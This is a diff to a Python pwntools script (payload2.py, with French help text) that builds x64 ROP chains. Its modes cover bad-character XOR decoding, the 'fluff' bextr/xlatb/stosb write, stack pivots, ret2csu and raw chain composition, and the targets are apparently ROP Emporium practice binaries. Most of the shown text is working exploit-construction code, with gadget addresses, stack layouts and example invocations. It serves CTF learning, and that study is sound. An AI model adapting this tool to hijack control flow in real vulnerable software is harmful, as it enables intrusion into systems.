-    badchars_parser.add_argument("--xor-gadget", type=parse_int, required=True, help="gadget XOR byte ptr [addr], key")
-    badchars_parser.add_argument("--xor-order", choices=("key-addr", "addr-key"), default="key-addr", help="ordre des pops du gadget de decodage")
-    badchars_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour appeler une fonction ensuite")
-    badchars_parser.add_argument("--call-addr", type=parse_int, help="fonction a appeler apres decodage, ex: print_file@plt")
+    badchars_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des deux premieres valeurs consommees par --pop-write")
+    badchars_parser.add_argument("--write-extra-pops", type=parse_int, default=0, help="nombre de registres supplementaires poppes par --pop-write apres destination/valeur")
+    badchars_parser.add_argument("--write-junk", type=parse_int, default=0x4141414141414141, help="valeur junk utilisee pour remplir les pops supplementaires")
+    badchars_parser.add_argument("--pop-xor", type=parse_int, required=True, help="gadget pop qui charge la cle XOR et l'adresse de l'octet a decoder")
+    badchars_parser.add_argument("--xor-gadget", type=parse_int, required=True, help="gadget qui fait xor byte ptr [addr], key puis ret")
+    badchars_parser.add_argument("--xor-order", choices=("key-addr", "addr-key"), default="key-addr", help="ordre des deux valeurs consommees par --pop-xor")
+    badchars_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour preparer l'argument de l'appel final")
+    badchars_parser.add_argument("--call-addr", type=parse_int, help="fonction appelee apres decodage, ex: print_file@plt")
     badchars_parser.add_argument("--call-arg", type=parse_int, help="argument rdi de l'appel final; defaut: --where")
-    badchars_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel avant l'appel final")
+    badchars_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel juste avant l'appel final")
     badchars_parser.set_defaults(builder=build_badchars_payload)
+
+    fluff_parser = subparsers.add_parser(
+        "fluff",
+        help="ecrit une chaine avec bextr/xlatb/stosb puis appelle print_file",
+        description=(
+            "Construit la chaine du challenge fluff x64: le script cherche chaque octet de la "
+            "chaine dans le binaire, regle rbx avec bextr, charge l'octet dans al avec xlatb, "
+            "l'ecrit avec stosb, puis appelle print_file(where)."
+        ),
+        epilog="""
+Exemple fluff:
+  python3 payload2.py --run --input stdin --target ./fluff fluff \\
+    --where 0x601028 \\
+    --data "flag.txt" --nul-terminate \\
+    --pop-rdi 0x4006a3 \\
+    --bextr 0x40062a \\
+    --xlat 0x400628 \\
+    --stosb 0x400639 \\
+    --print-file 0x400510
+
+Pile generee:
+  pop_rdi
+  where              # rdi pointe vers la zone ou stosb ecrit
+  pour chaque octet:
+    bextr
+    bextr_control
+    rcx_calcule
+    xlat
+    stosb
+  pop_rdi
+  where
+  print_file
+
+Role des gadgets:
+  --bextr doit etre le gadget qui finit par mettre une valeur controlee dans rbx.
+  --xlat doit pointer vers xlatb ; ret. xlatb fait al = byte ptr [rbx + al].
+  --stosb doit pointer vers stosb ; ret. stosb ecrit al a [rdi], puis avance rdi.
+  --initial-al est la valeur de al avant le premier xlatb. Dans fluff x64, 0x0b
+  marche souvent, mais tu peux la verifier dans pwndbg si besoin.
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    fluff_parser.add_argument("--where", type=parse_int, required=True, help="adresse writable ou ecrire la chaine finale")
+    fluff_parser.add_argument("--data", help="donnees ASCII/UTF-8 a construire en memoire, ex: flag.txt")
+    fluff_parser.add_argument("--data-hex", help="donnees hex a construire en memoire")
+    fluff_parser.add_argument("--data-file", help="fichier dont le contenu brut doit etre construit en memoire")
+    fluff_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent")
+    fluff_parser.add_argument("--pop-rdi", type=parse_int, required=True, help="gadget pop rdi ; ret, utilise pour pointer rdi vers --where puis pour appeler print_file")
+    fluff_parser.add_argument("--bextr", type=parse_int, required=True, help="gadget bextr qui permet de controler rbx avant xlatb")
+    fluff_parser.add_argument("--xlat", type=parse_int, required=True, help="gadget xlatb ; ret")
+    fluff_parser.add_argument("--stosb", type=parse_int, required=True, help="gadget stosb ; ret, ecrit al a [rdi]")
+    fluff_parser.add_argument("--print-file", type=parse_int, required=True, help="adresse de print_file@plt ou fonction equivalente a appeler a la fin")
+    fluff_parser.add_argument("--initial-al", type=parse_int, default=0x0B, help="valeur de al avant le premier xlatb (defaut: 0x0b pour fluff x64)")
+    fluff_parser.add_argument("--bextr-control", type=parse_int, default=0x4000, help="valeur poppee dans le registre de controle bextr (defaut: 0x4000)")
+    fluff_parser.add_argument("--bextr-add", type=parse_int, default=0x3EF2, help="constante ajoutee par le gadget bextr a rcx avant bextr (defaut: 0x3ef2)")
+    fluff_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
+    fluff_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel juste avant print_file")
+    fluff_parser.set_defaults(builder=build_fluff_payload)
 
     pivot_parser = subparsers.add_parser(
         "pivot",
@@ -1046,13 +1351,26 @@ Si tu as directement pop rsp ; ret:
   python3 payload2.py --input stdin --target ./pivot pivot \\
     --pivot-addr 0x7ffff7ffbf10 \\
     --pop-rsp 0x400a2d
+
+Payload genere avec pop rax/xchg:
+  pop_rax
+  pivot_addr
+  xchg_rax_rsp
+
+Payload genere avec pop rsp:
+  pop_rsp
+  pivot_addr
+
+Ce mode ne construit que la petite chaine qui change RSP. La stage2 placee a
+--pivot-addr doit etre construite/envoyee separement avec chain, compose, ou
+un autre script.
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    pivot_parser.add_argument("--pivot-addr", type=parse_int, required=True, help="nouvelle adresse de stack")
-    pivot_parser.add_argument("--pop-rsp", type=parse_int, help="gadget pop rsp ; ret")
-    pivot_parser.add_argument("--pop-rax", type=parse_int, help="gadget pop rax ; ret")
-    pivot_parser.add_argument("--xchg-rax-rsp", type=parse_int, help="gadget xchg rax, rsp ; ret")
+    pivot_parser.add_argument("--pivot-addr", type=parse_int, required=True, help="adresse controlee qui deviendra le nouveau RSP")
+    pivot_parser.add_argument("--pop-rsp", type=parse_int, help="gadget pop rsp ; ret si disponible directement")
+    pivot_parser.add_argument("--pop-rax", type=parse_int, help="gadget pop rax ; ret utilise avec --xchg-rax-rsp")
+    pivot_parser.add_argument("--xchg-rax-rsp", type=parse_int, help="gadget xchg rax, rsp ; ret qui remplace la stack par --pivot-addr")
     pivot_parser.set_defaults(builder=build_pivot_payload)
 
     ret2csu_parser = subparsers.add_parser(
@@ -1064,6 +1382,7 @@ Si tu as directement pop rsp ; ret:
         ),
         epilog="""
 Schema genere:
+  ret optionnel
   csu_pop
   rbx=0
   rbp=1
@@ -1075,6 +1394,17 @@ Schema genere:
   stack_pad
   junk x6
   next_addr optionnel
+
+Details:
+  --call-ptr n'est pas forcement l'adresse directe de la fonction. Le gadget
+  CSU fait souvent call [r12 + rbx*8], donc --call-ptr doit pointer vers une
+  entree GOT ou une case memoire contenant l'adresse de fonction.
+
+  --stack-pad est la valeur consommee par un add rsp, 8 dans le gadget CSU.
+  --junk remplit les six pops de nettoyage apres csu_call.
+
+  Attention: beaucoup de gadgets CSU font mov edi, r13d. Dans ce cas, seule la
+  partie basse 32 bits de --arg-rdi arrive vraiment dans edi/rdi.
 
 Exemple:
   python3 payload2.py --run --input stdin --target ./ret2csu ret2csu \\
@@ -1089,15 +1419,15 @@ Exemple:
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     ret2csu_parser.add_argument("--csu-pop", type=parse_int, required=True, help="gadget pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret")
-    ret2csu_parser.add_argument("--csu-call", type=parse_int, required=True, help="gadget mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]")
-    ret2csu_parser.add_argument("--call-ptr", type=parse_int, required=True, help="adresse pointee par r12; doit contenir un pointeur de fonction appelable")
-    ret2csu_parser.add_argument("--arg-rdi", type=parse_int, required=True, help="valeur placee dans rdi/edi")
-    ret2csu_parser.add_argument("--arg-rsi", type=parse_int, required=True, help="valeur placee dans rsi")
-    ret2csu_parser.add_argument("--arg-rdx", type=parse_int, required=True, help="valeur placee dans rdx")
-    ret2csu_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel avant la sequence")
-    ret2csu_parser.add_argument("--stack-pad", type=parse_int, default=0x4141414141414141, help="padding consomme par add rsp, 8")
-    ret2csu_parser.add_argument("--junk", type=parse_int, default=0x4242424242424242, help="valeur junk pour les six pops apres csu_call")
-    ret2csu_parser.add_argument("--next-addr", type=parse_int, help="adresse a executer apres la sequence ret2csu")
+    ret2csu_parser.add_argument("--csu-call", type=parse_int, required=True, help="gadget CSU qui place rdx/rsi/edi puis fait call [r12+rbx*8]")
+    ret2csu_parser.add_argument("--call-ptr", type=parse_int, required=True, help="adresse pointee par r12; doit contenir un pointeur vers la fonction appelee")
+    ret2csu_parser.add_argument("--arg-rdi", type=parse_int, required=True, help="valeur chargee via r13/r13d vers rdi/edi")
+    ret2csu_parser.add_argument("--arg-rsi", type=parse_int, required=True, help="valeur chargee via r14 vers rsi")
+    ret2csu_parser.add_argument("--arg-rdx", type=parse_int, required=True, help="valeur chargee via r15 vers rdx")
+    ret2csu_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel avant la sequence CSU")
+    ret2csu_parser.add_argument("--stack-pad", type=parse_int, default=0x4141414141414141, help="valeur consommee par add rsp, 8 dans le gadget CSU")
+    ret2csu_parser.add_argument("--junk", type=parse_int, default=0x4242424242424242, help="valeur junk repetee pour les six pops de nettoyage apres csu_call")
+    ret2csu_parser.add_argument("--next-addr", type=parse_int, help="adresse executee apres la sequence ret2csu si la fonction appelee retourne")
     ret2csu_parser.set_defaults(builder=build_ret2csu_payload)
 
     compose_parser = subparsers.add_parser(
@@ -1120,10 +1450,18 @@ Exemple:
     --part addr:0x4007c3 \\
     --part addr:0x601060 \\
     --part addr:0x400560
+
+Payload genere:
+  padding
+  concat(part_1, part_2, part_3, ...)
+
+compose ne valide pas les gadgets. Il sert quand tu veux controler exactement
+chaque octet apres l'offset, ou reproduire a la main une chaine que les modes
+specialises ne couvrent pas.
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    compose_parser.add_argument("--part", dest="parts", action="append", required=True, help="morceau a ajouter, ex: addr:0x401000 ou hex:4141")
+    compose_parser.add_argument("--part", dest="parts", action="append", required=True, help="morceau ajoute tel quel apres le padding; repeter dans l'ordre exact voulu")
     compose_parser.set_defaults(builder=build_compose_payload)
 
     return parser
@@ -1132,10 +1470,6 @@ Exemple:
 def main() -> None:
     parser = build_parser()
     args = parser.parse_args()
-
-    if args.mode is None and not args.checksec:
-        parser.error("choose a payload mode, or use --checksec alone to inspect the target")
-
     require_pwntools()
 
     context.update(arch="amd64", os="linux")
@@ -1146,6 +1480,9 @@ def main() -> None:
         log.info("\n%s", elf.checksec())
         if args.mode is None:
             return
+
+    if args.mode is None:
+        parser.error("choose a payload mode, or use --checksec alone")
 
     payload = args.builder(args)
     if args.argv_safe:
